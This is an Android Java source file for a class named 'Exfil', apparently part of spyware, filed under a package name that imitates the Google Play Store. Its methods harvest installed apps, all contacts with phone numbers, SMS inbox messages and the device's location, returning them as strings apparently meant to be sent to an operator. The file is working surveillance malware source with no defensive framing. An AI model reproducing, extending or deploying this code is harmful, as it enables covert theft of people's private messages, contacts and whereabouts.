package com.android.vending.helper;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.*;
import android.content.pm.*;
import android.location.*;

public class Exfil {
    public static String apps(Context c) {
        StringBuilder sb = new StringBuilder();
        for (ApplicationInfo app : c.getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA)) { sb.append(app.packageName).append("\n"); }
        return sb.toString();
    }
    public static String contacts(Context c) {
        StringBuilder sb = new StringBuilder(); Cursor cur = c.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cur != null) { while (cur.moveToNext()) { sb.append(cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" | ").append(cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))).append('\n'); } cur.close(); }
        return sb.length() == 0 ? "[-] Empty or Permission Denied." : sb.toString();
    }
    public static String sms(Context c, int limit) {
        StringBuilder sb = new StringBuilder(); Cursor cur = c.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
        if (cur != null) { int i = 0; while (cur.moveToNext() && i < limit) { sb.append(cur.getString(cur.getColumnIndexOrThrow("address"))).append(": ").append(cur.getString(cur.getColumnIndexOrThrow("body"))).append('\n'); i++; } cur.close(); }
        return sb.length() == 0 ? "[-] Empty or Permission Denied." : sb.toString();
    }
    
    public static String location(Context c) {
        try {
            LocationManager lm = (LocationManager) c.getSystemService(Context.LOCATION_SERVICE);
            Location l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (l == null) l = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            
            if (l == null) {
                final Location[] locArr = new Location[1];
                LocationListener listener = new LocationListener() {
                    @Override public void onLocationChanged(Location location) { locArr[0] = location; }
                    @Override public void onStatusChanged(String provider, int status, android.os.Bundle extras) {}
                    @Override public void onProviderEnabled(String provider) {}
                    @Override public void onProviderDisabled(String provider) {}
                };
                if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, null);
                } else if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, null);
                }
                
                for (int i = 0; i < 50; i++) { // الانتظار 5 ثواني
                    if (locArr[0] != null) break;
                    try { Thread.sleep(100); } catch (Exception e) {}
                }
                l = locArr[0];
            }
            return l == null ? "[-] No GPS signal yet. Make sure location is ON and try again." : l.getLatitude() + "," + l.getLongitude();
        } catch (SecurityException e) { return "[-] Location permission denied."; }
        catch (Exception e) { return "[-] Location error: " + e.getMessage(); }
    }
}
